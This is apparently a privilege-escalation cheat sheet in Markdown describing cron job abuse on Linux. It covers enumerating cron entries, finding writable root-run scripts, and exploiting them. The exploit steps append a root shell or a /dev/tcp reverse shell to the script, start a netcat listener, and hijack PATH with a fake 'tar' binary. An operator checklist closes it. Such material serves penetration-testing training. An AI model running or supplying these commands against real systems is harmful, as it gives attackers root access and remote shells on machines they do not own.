
# Cron Job Abuse  

Cron runs scheduled tasks as root or system users.  
If you can modify a script that cron executes → privilege escalation.

---

## 1. Identify Cron Jobs

### System-wide cron
```bash
ls -lah /etc/cron*
````

### Look for activity in logs

```bash
grep CRON /var/log/syslog
# or on some distros
grep CRON /var/log/cron.log
```

### Check user-specific cron

```bash
crontab -l
cat /var/spool/cron/crontabs/* 2>/dev/null
```

---

## 2. Find the Script Being Executed

Once you locate a cron entry:

```bash
* * * * * root /path/to/script.sh
```

Inspect the file:

```bash
ls -lah /path/to/script.sh
cat /path/to/script.sh
```

Look for:

* `root` or privileged context
* writable permissions (`rw-rw-rw-`, `rw-r--rw-`)
* absolute vs relative paths
* custom scripts under `/opt/`, `/home/`, `/usr/local/`

If writable → exploitable.

---

## 3. Exploit Writable Cron Script

### Append a root shell (simple)

```bash
echo "/bin/bash -p" >> /path/to/script.sh
```

### Or reverse shell

```bash
echo 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1' >> /path/to/script.sh
```

Start listener:

```bash
nc -lvnp 4444
```

When cron runs → root shell.

---

## 4. Replace Script Completely (lab-only)

```bash
echo "/bin/bash -p" > /path/to/script.sh
chmod +x /path/to/script.sh
```

---

## 5. Cron + PATH Hijacking Combo

If cron script calls:

```
tar
ls
cp
```

without full paths:

```bash
echo "/bin/bash -p" > tar
chmod +x tar
export PATH=.:$PATH
```

When cron executes `tar`, your fake binary runs as root.

(See [path-hijacking.md](linux_priv_esc/path-hijacking.md) for full method.)

---

## 6. Operator Checklist

* [ ] Find cron jobs (`ls -lah /etc/cron*`, `crontab -l`)
* [ ] Identify the script path
* [ ] Check if script is writable
* [ ] Append/replace payload
* [ ] Validate escalation (`id`)

---

**Cron jobs are pre-scheduled root shells — if you can write, you can escalate.**

